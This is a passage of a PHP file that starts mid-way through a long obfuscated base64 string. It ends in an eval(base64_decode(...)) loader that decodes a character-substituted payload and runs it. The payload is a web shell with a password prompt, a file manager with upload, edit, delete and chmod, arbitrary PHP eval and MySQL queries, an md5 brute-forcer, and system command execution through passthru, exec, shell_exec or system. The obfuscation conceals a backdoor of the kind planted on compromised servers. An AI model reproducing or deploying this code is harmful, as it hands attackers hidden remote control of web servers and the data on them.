UWydjMm1tMW5kJ10pOyAvL1kyMyB3MW50IGZyNDVzIHc0dGggdGgxdD8NCiAgICAgfQ0KICAgYnI1MWs7DQogICANCiAgIA0KICAgYzFzNSAnNWQ0dCc6IC8vRWQ0dCAxIGY0NQ0KICAgIDRmKDRzczV0KCRfUE9TVFsnNWQ0dGYycm0nXSkpDQogICAgew0KICAgICAkZiA9ICRfR0VUWydmNGw1J107DQogICAgICRmaCA9IGYycDVuKCRmLCAndycpIDJyIHByNG50ICJFcnIyciB3aDRsNSAycDVuNG5nIGY0bDUhIjsNCiAgICAgZndyNHQ1KCRmaCwgJF9QT1NUWyc1ZDR0ZjJybSddKSAyciBwcjRudCAiQzIzbGRuJ3QgczF2NSBmNGw1ISI7DQogICAgIGZjbDJzNSgkZmgpOw0KICAgIH0NCiAgICBwcjRudCAiRWQ0dDRuZyBmNGw1IDxiPiIuJF9HRVRbJ2Y0bDUnXS4iPC9iPiAoIi5wNXJtKCRfR0VUWydmNGw1J10pLiIpPGJyPjxicj48ZjJybSAxY3Q0Mm49XCIiLiRtNS4iP3A9NWQ0dCZmNGw1PSIuJF9HRVRbJ2Y0bDUnXS4iJmQ0cj0iLnI1MWxwMXRoKCcuJykuIlwiIG01dGgyZD1QT1NUPjx0NXh0MXI1MSBjMmxzPTkwIHIyd3M9NmkgbjFtNT1cIjVkNHRmMnJtXCI+IjsNCiAgICANCiAgICA0ZihmNGw1XzV4NHN0cygkX0dFVFsnZjRsNSddKSkNCiAgICB7DQogICAgICRyZCA9IGY0bDUoJF9HRVRbJ2Y0bDUnXSk7DQogICAgIGYycjUxY2goJHJkIDFzICRsKQ0KICAgICB7DQogICAgICBwcjRudCBodG1sc3A1YzQxbGNoMXJzKCRsKTsNCiAgICAgfQ0KICAgIH0NCiAgICANCiAgICBwcjRudCAiPC90NXh0MXI1MT48NG5wM3QgdHlwNT1zM2JtNHQgdjFsMzU9XCJTMXY1XCI+PC9mMnJtPiI7DQogICAgDQogICBicjUxazsNCiAgIA0KICAgYzFzNSAnZDVsNXQ1JzogLy9ENWw1dDUgMSBmNGw1DQogICANCiAgICA0Zig0c3M1dCgkX1BPU1RbJ3k1cyddKSkNCiAgICB7DQogICAgIDRmKDNubDRuaygkX0dFVFsnZjRsNSddKSkNCiAgICAgew0KICAgICAgcHI0bnQgIkY0bDUgZDVsNXQ1ZCBzM2NjNXNzZjNsbHkuIjsNCiAgICAgfQ0KICAgICA1bHM1DQogICAgIHsNCiAgICAgIHByNG50ICJDMjNsZG4ndCBkNWw1dDUgZjRsNS4iOw0KICAgICB9DQogICAgfQ0KICAgIA0KICAgIA0KICAgIDRmKDRzczV0KCRfR0VUWydmNGw1J10pICYmIGY0bDVfNXg0c3RzKCRfR0VUWydmNGw1J10pICYmICE0c3M1dCgkX1BPU1RbJ3k1cyddKSkNCiAgICB7DQogICAgIHByNG50ICJBcjUgeTIzIHMzcjUgeTIzIHcxbnQgdDIgZDVsNXQ1ICIuJF9HRVRbJ2Y0bDUnXS4iPzxicj4NCiAgICAgPGYycm0gMWN0NDJuPVwiIi4kbTUuIj9wPWQ1bDV0NSZmNGw1PSIuJF9HRVRbJ2Y0bDUnXS4iXCIgbTV0aDJkPVBPU1Q+DQogICAgIDw0bnAzdCB0eXA1PWg0ZGQ1biBuMW01PXk1cyB2MWwzNT15NXM+DQogICAgIDw0bnAzdCB0eXA1PXMzYm00dCB2MWwzNT1cIkQ1bDV0NVwiPg0KICAgICAiOw0KICAgIH0NCiAgIA0KICAgDQogICBicjUxazsNCiAgIA0KICAgDQogICBjMXM1ICc1djFsJzogLy9FdjFsMzF0NSBQSFAgYzJkNQ0KICAgDQogICAgcHI0bnQgIjxmMnJtIDFjdDQybj1cIiIuJG01LiI/cD01djFsXCIgbTV0aDJkPVBPU1Q+DQogICAgPHQ1eHQxcjUxIGMybHM9ZTAgcjJ3cz02MCBuMW01PVwiNXYxbFwiPiI7DQogICAgNGYoNHNzNXQoJF9QT1NUWyc1djFsJ10pKQ0KICAgIHsNCiAgICAgcHI0bnQgaHRtbHNwNWM0MWxjaDFycygkX1BPU1RbJzV2MWwnXSk7DQogICAgfQ0KICAgIDVsczUNCiAgICB7DQogICAgIHByNG50ICJwcjRudCBcIlkyIE0ybW0xXCI7IjsNCiAgICB9DQogICAgcHI0bnQgIjwvdDV4dDFyNTE+PGJyPg0KICAgIDw0bnAzdCB0eXA1PXMzYm00dCB2MWwzNT1cIkV2MWxcIj4NCiAgICA8L2Yycm0+IjsNCiAgICANCiAgICA0Zig0c3M1dCgkX1BPU1RbJzV2MWwnXSkpDQogICAgew0KICAgICBwcjRudCAiPGg2Pk8zdHAzdDo8L2g2PiI7DQogICAgIHByNG50ICI8YnI+IjsNCiAgICAgNXYxbCgkX1BPU1RbJzV2MWwnXSk7DQogICAgfQ0KICAgDQogICBicjUxazsNCiAgIA0KICAgYzFzNSAnY2htMmQnOiAvL0NobTJkIGY0bDUNCiAgICANCiAgICANCiAgICBwcjRudCAiPGg2PlVuZDVyIGMybnN0cjNjdDQybiE8L2g2PiI7DQogICAgNGYoNHNzNXQoJF9QT1NUWydjaG0yZCddKSkNCiAgICB7DQogICAgc3c0dGNoICgkX1BPU1RbJ2NodjFsMzUnXSl7DQogICAgIGMxczUgNzc3Og0KICAgICBjaG0yZCgkX1BPU1RbJ2NobTJkJ10sMDc3Nyk7DQogICAgIGJyNTFrOw0KICAgICBjMXM1IGV1dToNCiAgICAgY2htMmQoJF9QT1NUWydjaG0yZCddLDBldXUpOw0KICAgICBicjUxazsNCiAgICAgYzFzNSA3aWk6DQogICAgIGNobTJkKCRfUE9TVFsnY2htMmQnXSwwN2lpKTsNCiAgICAgYnI1MWs7DQogICAgfQ0KICAgIHByNG50ICJDaDFuZzVkIHA1cm00c3M0Mm5zIDJuICIuJF9QT1NUWydjaG0yZCddLiIgdDIgIi4kX1BPU1RbJ2NodjFsMzUnXS4iLiI7DQogICAgfQ0KICAgIDRmKDRzczV0KCRfR0VUWydmNGw1J10pKQ0KICAgIHsNCiAgICAgJGMybnQ1bnQgPSAzcmxkNWMyZDUoJF9HRVRbJ2Y0bDUnXSk7DQogICAgfQ0KICAgIDVsczUNCiAgICB7DQogICAgICRjMm50NW50ID0gImY0bDUvcDF0aC9wbDUxczUiOw0KICAgIH0NCiAgICANCiAgICBwcjRudCAiPGYycm0gMWN0NDJuPVwiIi4kbTUuIj9wPWNobTJkJmY0bDU9Ii4kYzJudDVudC4iJmQ0cj0iLnI1MWxwMXRoKCcuJykuIlwiIG01dGgyZD1QT1NUPjxiPkY0bDUgdDIgY2htMmQ6DQogICAgPDRucDN0IHR5cDU9dDV4dCBuMW01PWNobTJkIHYxbDM1PVwiIi4kYzJudDVudC4iXCIgczR6NT03MD48YnI+PGI+TjV3IHA1cm00c3M0Mm46PC9iPg0KICAgIDxzNWw1Y3QgbjFtNT1cImNodjFsMzVcIj4NCjwycHQ0Mm4gdjFsMzU9XCI3NzdcIj43Nzc8LzJwdDQybj4NCjwycHQ0Mm4gdjFsMzU9XCJldXVcIj5ldXU8LzJwdDQybj4NCjwycHQ0Mm4gdjFsMzU9XCI3aWlcIj43aWk8LzJwdDQybj4NCjwvczVsNWN0Pjw0bnAzdCB0eXA1PXMzYm00dCB2MWwzNT1cIkNoMW5nNVwiPiI7DQogICAgDQogICBicjUxazsNCiAgIA0KICAgYzFzNSAnbXlzcWwnOiAvL015U1FMIFEzNXJ5DQogICANCiAgIDRmKDRzczV0KCRfUE9TVFsnaDJzdCddKSkNCiAgIHsNCiAgICAkbDRuayA9IG15c3FsX2Mybm41Y3QoJF9QT1NUWydoMnN0J10sICRfUE9TVFsnM3M1cm4xbTUnXSwgJF9QT1NUWydteXNxbHAxc3MnXSkgMnIgZDQ1KCdDMjNsZCBuMnQgYzJubjVjdDogJyAuIG15c3FsXzVycjJyKCkpOw0KICAgIG15c3FsX3M1bDVjdF9kYigkX1BPU1RbJ2RiMXM1J10pOw0KICAgICRzcWwgPSAkX1BPU1RbJ3EzNXJ5J107DQogICAgDQogICAgDQogICAgJHI1czNsdCA9IG15c3FsX3EzNXJ5KCRzcWwpOw0KICAgIA0KICAgfQ0KICAgNWxzNQ0KICAgew0KICAgIHByNG50ICINCiAgICBUaDRzIDJubHkgcTM1cjQ1cyB0aDUgZDF0MWIxczUsIGQyNXNuJ3QgcjV0M3JuIGQxdDEhPGJyPg0KICAgIDxmMnJtIDFjdDQybj1cIiIuJG01LiI/cD1teXNxbFwiIG01dGgyZD1QT1NUPg0KICAgIDxiPkgyc3Q6PGJyPjwvYj48NG5wM3QgdHlwNT10NXh0IG4xbTU9aDJzdCB2MWwzNT1cImwyYzFsaDJzdFwiIHM0ejU9NjA+PGJyPg0KICAgIDxiPlVzNXJuMW01Ojxicj48NG5wM3QgdHlwNT10NXh0IG4xbTU9M3M1cm4xbTUgdjFsMzU9XCJyMjJ0XCIgczR6NT02MD48YnI+DQogICAgPGI+UDFzc3cycmQ6PGJyPjwvYj48NG5wM3QgdHlwNT1wMXNzdzJyZCBuMW01PW15c3FscDFzcyB2MWwzNT1cIlwiIHM0ejU9NjA+PGJyPg0KICAgIDxiPkQxdDFiMXM1Ojxicj48NG5wM3QgdHlwNT10NXh0IG4xbTU9ZGIxczUgdjFsMzU9XCJ0NXN0XCIgczR6NT02MD48YnI+DQogICAgDQogICAgPGI+UTM1cnk6PGJyPjwvYjx0NXh0MXI1MSBuMW01PXEzNXJ5PjwvdDV4dDFyNTE+DQogICAgPDRucDN0IHR5cDU9czNibTR0IHYxbDM1PVwiUTM1cnkgZDF0MWIxczVcIj4NCiAgICA8L2Yycm0+DQogICAgIjsNCiAgICANCiAgIH0NCiAgIA0KICAgYnI1MWs7DQogICANCiAgIGMxczUgJ2NyNTF0NWQ0cic6DQogICA0Zihta2Q0cigkX0dFVFsnY3JkNHInXSkpDQogICB7DQogICBwcjRudCAnRDRyNWN0MnJ5IGNyNTF0NWQgczNjYzVzc2YzbGx5Lic7DQogICB9DQogICA1bHM1DQogICB7DQogICBwcjRudCAnQzIzbGRuXCd0IGNyNTF0NSBkNHI1Y3QycnknOw0KICAgfQ0KICAgYnI1MWs7DQogICANCiAgIA0KICAgYzFzNSAncGhwNG5mMic6IC8vUEhQIEluZjINCiAgICBwaHA0bmYyKCk7DQogICBicjUxazsNCiAgIA0KICAgDQogICBjMXM1ICdyNW4xbTUnOg0KICAgDQogICAgNGYoNHNzNXQoJF9QT1NUWydmNGw1MmxkJ10pKQ0KICAgIHsNCiAgICAgNGYocjVuMW01KCRfUE9TVFsnZjRsNTJsZCddLCRfUE9TVFsnZjRsNW41dyddKSkNCiAgICAgew0KICAgICAgcHI0bnQgIkY0bDUgcjVuMW01ZC4iOw0KICAgICB9DQogICAgIDVsczUNCiAgICAgew0KICAgICAgcHI0bnQgIkMyM2xkbid0IHI1bjFtNSBmNGw1LiI7DQogICAgIH0NCiAgICAgDQogICAgfQ0KICAgIDRmKDRzczV0KCRfR0VUWydmNGw1J10pKQ0KICAgIHsNCiAgICAgJGY0bDUgPSBiMXM1bjFtNShodG1sc3A1YzQxbGNoMXJzKCRfR0VUWydmNGw1J10pKTsNCiAgICB9DQogICAgNWxzNQ0KICAgIHsNCiAgICAgJGY0bDUgPSAiIjsNCiAgICB9DQogICAgDQogICAgcHI0bnQgIlI1bjFtNG5nICIuJGY0bDUuIiA0biBmMmxkNXIgIi5yNTFscDF0aCgnLicpLiIuPGJyPg0KICAgICAgICA8ZjJybSAxY3Q0Mm49XCIiLiRtNS4iP3A9cjVuMW01JmQ0cj0iLnI1MWxwMXRoKCcuJykuIlwiIG01dGgyZD1QT1NUPg0KICAgICA8Yj5SNW4xbTU6PGJyPjwvYj48NG5wM3QgdHlwNT10NXh0IG4xbTU9ZjRsNTJsZCB2MWwzNT1cIiIuJGY0bDUuIlwiIHM0ejU9NzA+PGJyPg0KICAgICA8Yj5UMjo8YnI+PDRucDN0IHR5cDU9dDV4dCBuMW01PWY0bDVuNXcgdjFsMzU9XCJcIiBzNHo1PTYwPjxicj4NCiAgICAgPDRucDN0IHR5cDU9czNibTR0IHYxbDM1PVwiUjVuMW01IGY0bDVcIj4NCiAgICAgPC9mMnJtPiI7DQogICBicjUxazsNCiAgIA0KICAgYzFzNSAnbWRpJzoNCiAgIDRmKDRzczV0KCRfUE9TVFsnbWRpJ10pKQ0KICAgew0KICAgNGYoITRzX24zbTVyNGMoJF9QT1NUWyd0NG01bDRtNHQnXSkpDQogICB7DQogICAkX1BPU1RbJ3Q0bTVsNG00dCddID0gbzA7DQogICB9DQogICBzNXRfdDRtNV9sNG00dCgkX1BPU1RbJ3Q0bTVsNG00dCddKTsNCiAgICA0ZihzdHJsNW4oJF9QT1NUWydtZGknXSkgPT0gb2EpDQogICAgew0KICAgICANCiAgICAgIDRmKCRfUE9TVFsnY2gxcnMnXSA9PSAiOTk5OSIpDQogICAgICB7DQogICAgICAkNCA9IDA7DQogICAgICB3aDRsNSgkX1BPU1RbJ21kaSddICE9IG1kaSgkNCkgJiYgJDQgIT0gNjAwMDAwKQ0KICAgICAgIHsNCiAgICAgICAgJDQrKzsNCiAgICAgICB9DQogICAgICB9DQogICAgICA1bHM1DQogICAgICB7DQogICAgICAgZjJyKCQ0ID0gIjEiOyAkNCAhPSAienp6enoiOyAkNCsrKQ0KICAgICAgIHsNCiAgICAgICAgNGYobWRpKCQ0ID09ICRfUE9TVFsnbWRpJ10pKQ0KICAgICAgICB7DQogICAgICAgICBicjUxazsNCiAgICAgICAgfQ0KICAgICAgIH0NCiAgICAgIH0NCiAgICAgDQogICAgIDRmKG1kaSgkNCkgPT0gJF9QT1NUWydtZGknXSkNCiAgICAgew0KICAgICAgIHByNG50ICI8aDY+UGwxNG50NXh0IDJmICIuICRfUE9TVFsnbWRpJ10uICIgNHMgPDQ+Ii4kNC4iPC80PjwvaDY+PGJyPjxicj4iOw0KICAgICB9DQogICAgIA0KICAgIH0NCiAgICANCiAgIH0NCiAgIA0KICAgcHI0bnQgIlc0bGwgYnIzdDVmMnJjNSB0aDUgbWRpDQogICAgPGYycm0gMWN0NDJuPVwiIi4kbTUuIj9wPW1kaVwiIG01dGgyZD1QT1NUPg0KICAgIDxiPm1kaSB0MiBjcjFjazo8YnI+PC9iPjw0bnAzdCB0eXA1PXQ1eHQgbjFtNT1tZGkgdjFsMzU9XCJcIiBzNHo1PXUwPjxicj4NCiAgICA8Yj5DaDFyMWN0NXJzOjwvYj48YnI+PHM1bDVjdCBuMW01PVwiY2gxcnNcIj4NCiAgICA8MnB0NDJuIHYxbDM1PVwiMXpcIj4xIC0genp6eno8LzJwdDQybj4NCiAgICA8MnB0NDJuIHYxbDM1PVwiOTk5OVwiPjYgLSA5OTk5OTk5PC8ycHQ0Mm4+DQogICAgPC9zNWw1Y3Q+DQogICAgPGI+TTF4LiBjcjFjazRuZyB0NG01Kjo8YnI+PC9iPjw0bnAzdCB0eXA1PXQ1eHQgbjFtNT10NG01bDRtNHQgdjFsMzU9XCJvMFwiIHM0ejU9YT48YnI+DQogICAgPDRucDN0IHR5cDU9czNibTR0IHYxbDM1PVwiQnIzdDVmMnJjNSBtZGlcIj4NCiAgICA8L2Yycm0+PGJyPio6IDRmIHM1dF90NG01X2w0bTR0IDRzIDFsbDJ3NWQgYnkgcGhwLjRuNCI7DQogICBicjUxazsNCiAgIA0KICAgYzFzNSAnaDUxZDVycyc6DQogICBmMnI1MWNoKGc1dDFsbGg1MWQ1cnMoKSAxcyAkaDUxZDVyID0+ICR2MWwzNSkNCiAgIHsNCiAgIHByNG50IGh0bWxzcDVjNDFsY2gxcnMoJGg1MWQ1ciAuICI6IiAuICR2MWwzNSkuIjxicj4iOw0KICAgDQogICB9DQogICBicjUxazsNCiAgfQ0KfQ0KNWxzNSAvL0Q1ZjEzbHQgcDFnNSB0aDF0IHc0bGwgYjUgc2gyd24gd2g1biB0aDUgcDFnNSA0c24ndCBmMjNuZCAyciBuMiBwMWc1IDRzIHM1bDVjdDVkLg0Kew0KIA0KICRmNGw1cyA9IDFycjF5KCk7DQogJGQ0cjVjdDJyNDVzID0gMXJyMXkoKTsNCiANCiA0Zig0c3M1dCgkX0ZJTEVTWyczcGwyMWQ1ZGY0bDUnXVsnbjFtNSddKSkNCnsNCiAkdDFyZzV0X3AxdGggPSByNTFscDF0aCgnLicpLicvJzsNCiAkdDFyZzV0X3AxdGggPSAkdDFyZzV0X3AxdGggLiBiMXM1bjFtNSggJF9GSUxFU1snM3BsMjFkNWRmNGw1J11bJ24xbTUnXSk7IA0KIDRmKG0ydjVfM3BsMjFkNWRfZjRsNSgkX0ZJTEVTWyczcGwyMWQ1ZGY0bDUnXVsndG1wX24xbTUnXSwgJHQxcmc1dF9wMXRoKSkgew0KICAgICBwcjRudCAiRjRsNToiLiAgYjFzNW4xbTUoICRfRklMRVNbJzNwbDIxZDVkZjRsNSddWyduMW01J10pLiANCiAgICAgIiBoMXMgYjU1biAzcGwyMWQ1ZCI7DQogfSA1bHM1ew0KICAgICA1Y2gyICJGNGw1IDNwbDIxZCBmMTRsNWQhIjsNCiB9DQp9DQoNCiANCiANCiANCiBwcjRudCAiPHQxYmw1IGIycmQ1cj0wIHc0ZHRoPTYwMCU+PHRkIHc0ZHRoPWklIDRkPXM+PGI+T3B0NDJuczwvYj48L3RkPjx0ZCA0ZD1zPjxiPkY0bDVuMW01PC9iPjwvdGQ+PHRkIDRkPXM+PGI+UzR6NTwvYj48L3RkPjx0ZCA0ZD1zPjxiPlA1cm00c3M0Mm5zPC9iPjwvdGQ+PHRkIDRkPXM+TDFzdCBtMmQ0ZjQ1ZDwvdGQ+PHRyPiI7DQogNGYgKCRoMW5kbDUgPSAycDVuZDRyKCcuJykpDQogew0KICB3aDRsNSAoZjFsczUgIT09ICgkZjRsNSA9IHI1MWRkNHIoJGgxbmRsNSkpKSANCiAgew0KICAgICAgICA0Zig0c19kNHIoJGY0bDUpKQ0KICAgICB7DQogICAgJGQ0cjVjdDJyNDVzW10gPSAkZjRsNTsNCiAgICAgfQ0KICAgICA1bHM1DQogICAgIHsNCiAgICAkZjRsNXNbXSA9ICRmNGw1Ow0KICAgICB9DQogIH0NCiAxczJydCgkZDRyNWN0MnI0NXMpOw0KIDFzMnJ0KCRmNGw1cyk7DQogIGYycjUxY2goJGQ0cjVjdDJyNDVzIDFzICRmNGw1KQ0KICB7DQogICBwcjRudCAiPHRkIDRkPWQ+PDEgaHI1Zj1cIj9wPXI1bjFtNSZmNGw1PSIucjUxbHAxdGgoJGY0bDUpLiImZDRyPSIucjUxbHAxdGgoJy4nKS4iXCI+W1JdPC8xPjwxIGhyNWY9XCI/cD1kNWw1dDUmZjRsNT0iLnI1MWxwMXRoKCRmNGw1KS4iXCI+W0RdPC8xPjwvdGQ+PHRkIDRkPWQ+PDEgaHI1Zj1cIiIuJG01LiI/ZDRyPSIucjUxbHAxdGgoJGY0bDUpLiJcIj4iLiRmNGw1LiI8LzE+PC90ZD48dGQgNGQ9ZD48L3RkPjx0ZCA0ZD1kPjwxIGhyNWY9XCI/cD1jaG0yZCZkNHI9Ii5yNTFscDF0aCgnLicpLiImZjRsNT0iLnI1MWxwMXRoKCRmNGw1KS4iXCI+PGYybnQgYzJsMnI9Ii5nNXRfYzJsMnIoJGY0bDUpLiI+Ii5wNXJtKCRmNGw1KS4iPC9mMm50PjwvMT48L3RkPjx0ZCA0ZD1kPiIuZDF0NSAoIlkvbS9kLCBIOjQ6cyIsIGY0bDVtdDRtNSgkZjRsNSkpLiI8L3RkPjx0cj4iOw0KICB9DQogIA0KICBmMnI1MWNoKCRmNGw1cyAxcyAkZjRsNSkNCiAgew0KICAgcHI0bnQgIjx0ZCA0ZD1mPjwxIGhyNWY9XCI/cD1yNW4xbTUmZjRsNT0iLnI1MWxwMXRoKCRmNGw1KS4iJmQ0cj0iLnI1MWxwMXRoKCcuJykuIlwiPltSXTwvMT48MSBocjVmPVwiP3A9ZDVsNXQ1JmY0bDU9Ii5yNTFscDF0aCgkZjRsNSkuIlwiPltEXTwvMT48L3RkPjx0ZCA0ZD1mPjwxIGhyNWY9XCIiLiRtNS4iP3A9NWQ0dCZkNHI9Ii5yNTFscDF0aCgnLicpLiImZjRsNT0iLnI1MWxwMXRoKCRmNGw1KS4iXCI+Ii4kZjRsNS4iPC8xPjwvdGQ+PHRkIDRkPWY+Ii5mNGw1czR6NSgkZjRsNSkuIjwvdGQ+PHRkIDRkPWY+PDEgaHI1Zj1cIj9wPWNobTJkJmQ0cj0iLnI1MWxwMXRoKCcuJykuIiZmNGw1PSIucjUxbHAxdGgoJGY0bDUpLiJcIj48ZjJudCBjMmwycj0iLmc1dF9jMmwycigkZjRsNSkuIj4iLnA1cm0oJGY0bDUpLiI8L2YybnQ+PC8xPjwvdGQ+PHRkIDRkPWY+Ii5kMXQ1ICgiWS9tL2QsIEg6NDpzIiwgZjRsNW10NG01KCRmNGw1KSkuIjwvdGQ+PHRyPiI7DQogIH0NCiB9DQogNWxzNQ0KIHsNCiAgcHI0bnQgIjwzPkVycjJyITwvMz4gQzFuJ3QgMnA1biA8Yj4iLnI1MWxwMXRoKCcuJykuIjwvYj4hPGJyPiI7DQogfQ0KIA0KIHByNG50ICI8L3QxYmw1Pjxocj48dDFibDUgYjJyZDVyPTAgdzRkdGg9NjAwJT48dGQ+PGI+VXBsMjFkIGY0bDU8L2I+PGJyPjxmMnJtIDVuY3R5cDU9XCJtM2x0NHAxcnQvZjJybS1kMXQxXCIgMWN0NDJuPVwiIi4kbTUuIj9kNHI9Ii5yNTFscDF0aCgnLicpLiJcIiBtNXRoMmQ9XCJQT1NUXCI+DQo8NG5wM3QgdHlwNT1cImg0ZGQ1blwiIG4xbTU9XCJNQVhfRklMRV9TSVpFXCIgdjFsMzU9XCI2MDAwMDAwMDBcIiAvPjw0bnAzdCBzNHo1PW8wIG4xbTU9XCIzcGwyMWQ1ZGY0bDVcIiB0eXA1PVwiZjRsNVwiIC8+DQo8NG5wM3QgdHlwNT1cInMzYm00dFwiIHYxbDM1PVwiVXBsMjFkIEY0bDVcIiAvPg0KPC9mMnJtPjwvdGQ+PHRkPjxmMnJtIDFjdDQybj1cIiIuJG01LiJcIiBtNXRoMmQ9R0VUPjxiPkNoMW5nNSBENHI1Y3Qycnk8YnI+PC9iPjw0bnAzdCB0eXA1PXQ1eHQgczR6NT11MCBuMW01PWQ0ciB2MWwzNT1cIiIucjUxbHAxdGgoJy4nKS4iXCI+PDRucDN0IHR5cDU9czNibTR0IHYxbDM1PVwiQ2gxbmc1IEQ0cjVjdDJyeVwiPjwvZjJybT48L3RkPg0KPHRyPjx0ZD48ZjJybSAxY3Q0Mm49XCIiLiRtNS4iXCIgbTV0aDJkPUdFVD48Yj5DcjUxdDUgZjRsNTxicj48L2I+PDRucDN0IHR5cDU9aDRkZDVuIG4xbTU9ZDRyIHYxbDM1PVwiIi5yNTFscDF0aCgnLicpLiJcIj48NG5wM3QgdHlwNT10NXh0IHM0ejU9dTAgbjFtNT1mNGw1IHYxbDM1PVwiIi5yNTFscDF0aCgnLicpLiJcIj48NG5wM3QgdHlwNT1oNGRkNW4gbjFtNT1wIHYxbDM1PTVkNHQ+PDRucDN0IHR5cDU9czNibTR0IHYxbDM1PVwiQ3I1MXQ1IGY0bDVcIj48L2Yycm0+DQo8L3RkPjx0ZD48ZjJybSAxY3Q0Mm49XCIiLiRtNS4iXCIgbTV0aDJkPUdFVD48Yj5DcjUxdDUgZDRyNWN0MnJ5PGJyPjwvYj48NG5wM3QgdHlwNT10NXh0IHM0ejU9dTAgbjFtNT1jcmQ0ciB2MWwzNT1cIiIucjUxbHAxdGgoJy4nKS4iXCI+PDRucDN0IHR5cDU9aDRkZDVuIG4xbTU9ZDRyIHYxbDM1PVwiIi5yNTFscDF0aCgnLicpLiJcIj48NG5wM3QgdHlwNT1oNGRkNW4gbjFtNT1wIHYxbDM1PWNyNTF0NWQ0cj48NG5wM3QgdHlwNT1zM2JtNHQgdjFsMzU9XCJDcjUxdDUgZDRyNWN0MnJ5XCI+PC9mMnJtPjwvdGQ+DQo8L3QxYmw1PiI7DQoNCn0NCg0KZjNuY3Q0Mm4gbDJnNG4oKQ0Kew0KIHByNG50ICI8dDFibDUgYjJyZDVyPTAgdzRkdGg9NjAwJSBoNTRnaHQ9NjAwJT48dGQgdjFsNGduPVwibTRkZGw1XCI+PGM1bnQ1cj4NCiA8ZjJybSAxY3Q0Mm49Ii5iMXM1bjFtNShfX0ZJTEVfXykuIiBtNXRoMmQ9XCJQT1NUXCI+PGI+UDFzc3cycmQ/PC9iPg0KIDw0bnAzdCB0eXA1PVwicDFzc3cycmRcIiBtMXhsNW5ndGg9XCJvYVwiIG4xbTU9XCJwMXNzXCI+PDRucDN0IHR5cDU9XCJzM2JtNHRcIiB2MWwzNT1cIkwyZzRuXCI+DQogPC9mMnJtPiI7DQp9DQpmM25jdDQybiByNWwyMWQoKQ0Kew0KIGg1MWQ1cigiTDJjMXQ0Mm46ICIuYjFzNW4xbTUoX19GSUxFX18pKTsNCn0NCmYzbmN0NDJuIGc1dF81eDVjM3Q0Mm5fbTV0aDJkKCkNCnsNCiA0ZihmM25jdDQybl81eDRzdHMoJ3Axc3N0aHIzJykpeyAkbSA9ICJwMXNzdGhyMyI7IH0NCiA0ZihmM25jdDQybl81eDRzdHMoJzV4NWMnKSl7ICRtID0gIjV4NWMiOyB9DQogNGYoZjNuY3Q0Mm5fNXg0c3RzKCdzaDVsbF81eDVjJykpeyAkbSA9ICJzaDVsbF8gNXg1YyI7IH0NCiA0ZihmM25jdDQybl81eDRzdHMoJ3N5c3Q1bScpKXsgJG0gPSAic3lzdDVtIjsgfQ0KIDRmKCE0c3M1dCgkbSkpIC8vTjIgbTV0aDJkIGYyM25kIDotfA0KIHsNCiAgJG0gPSAiRDRzMWJsNWQiOw0KIH0NCiByNXQzcm4oJG0pOw0KfQ0KZjNuY3Q0Mm4gNXg1YzN0NV9jMm1tMW5kKCRtNXRoMmQsJGMybW0xbmQpDQp7DQogNGYoJG01dGgyZCA9PSAicDFzc3RocjMiKQ0KIHsNCiAgcDFzc3RocjMoJGMybW0xbmQpOw0KIH0NCiANCiA1bHM1NGYoJG01dGgyZCA9PSAiNXg1YyIpDQogew0KICA1eDVjKCRjMm1tMW5kLCRyNXMzbHQpOw0KICBmMnI1MWNoKCRyNXMzbHQgMXMgJDIzdHAzdCkNCiAgew0KICAgcHI0bnQgJDIzdHAzdC4iPGJyPiI7DQogIH0NCiB9DQogDQogNWxzNTRmKCRtNXRoMmQgPT0gInNoNWxsXzV4NWMiKQ0KIHsNCiAgcHI0bnQgc2g1bGxfNXg1YygkYzJtbTFuZCk7DQogfQ0KIA0KIDVsczU0ZigkbTV0aDJkID09ICJzeXN0NW0iKQ0KIHsNCiAgc3lzdDVtKCRjMm1tMW5kKTsNCiB9DQp9DQpmM25jdDQybiBwNXJtKCRmNGw1KQ0Kew0KIDRmKGY0bDVfNXg0c3RzKCRmNGw1KSkNCiB7DQogIHI1dDNybiBzM2JzdHIoc3ByNG50ZignJTInLCBmNGw1cDVybXMoJGY0bDUpKSwgLXUpOw0KIH0NCiA1bHM1DQogew0KICByNXQzcm4gIj8/Pz8iOw0KIH0NCn0NCmYzbmN0NDJuIGc1dF9jMmwycigkZjRsNSkNCnsNCjRmKDRzX3dyNHQxYmw1KCRmNGw1KSkgeyByNXQzcm4gImdyNTVuIjt9DQo0ZighNHNfd3I0dDFibDUoJGY0bDUpICYmIDRzX3I1MWQxYmw1KCRmNGw1KSkgeyByNXQzcm4gIndoNHQ1Ijt9DQo0ZighNHNfd3I0dDFibDUoJGY0bDUpICYmICE0c19yNTFkMWJsNSgkZjRsNSkpIHsgcjV0M3JuICJyNWQiO30NCiANCn0NCmYzbmN0NDJuIHNoMndfZDRycygkd2g1cjUpDQp7DQogNGYoNXI1ZygiXmM6IixyNTFscDF0aCgkd2g1cjUpKSkNCiB7DQogJGQ0cnAxcnRzID0gNXhwbDJkNSgnXFwnLHI1MWxwMXRoKCR3aDVyNSkpOw0KIH0NCiA1bHM1DQogew0KICRkNHJwMXJ0cyA9IDV4cGwyZDUoJy8nLHI1MWxwMXRoKCR3aDVyNSkpOw0KIH0NCiANCiANCiANCiAkNCA9IDA7DQogJHQydDFsID0gIiI7DQogDQogZjJyNTFjaCgkZDRycDFydHMgMXMgJHAxcnQpDQogew0KICAkcCA9IDA7DQogICRwcjUgPSAiIjsNCiAgd2g0bDUoJHAgIT0gJDQpDQogIHsNCiAgICRwcjUgLj0gJGQ0cnAxcnRzWyRwXS4iLyI7DQogICAkcCsrOw0KICAgDQogIH0NCiAgJHQydDFsIC49ICI8MSBocjVmPVwiIi5iMXM1bjFtNShfX0ZJTEVfXykuIj9kNHI9Ii4kcHI1LiRwMXJ0LiJcIj4iLiRwMXJ0LiI8LzE+LyI7DQogICQ0Kys7DQogfQ0KIA0KIHI1dDNybiAiPGhhPiIuJHQydDFsLiI8L2hhPjxicj4iOw0KfQ0KcHI0bnQgJGYyMnQ1cjsNCi8vIEV4NHQ6IG0xeWI1IHc1J3I1IDRuY2wzZDVkIHMybTV3aDVyNSAxbmQgdzUgZDJuJ3QgdzFudCB0aDUgMnRoNXIgYzJkNSB0MiBtNXNzIHc0dGggMjNycyA6LSkNCjV4NHQoKTsNCj8+DQog';eval(base64_decode('JF9YPWJhc2U2NF9kZWNvZGUoJF9YKTskX1g9c3RydHIoJF9YLCcxMjM0NTZhb3VpZScsJ2FvdWllMTIzNDU2Jyk7JF9SPWVyZWdfcmVwbGFjZSgnX19GSUxFX18nLCInIi4kX0YuIiciLCRfWCk7ZXZhbCgkX1IpOyRfUj0wOyRfWD0wOw=='));?> 
```

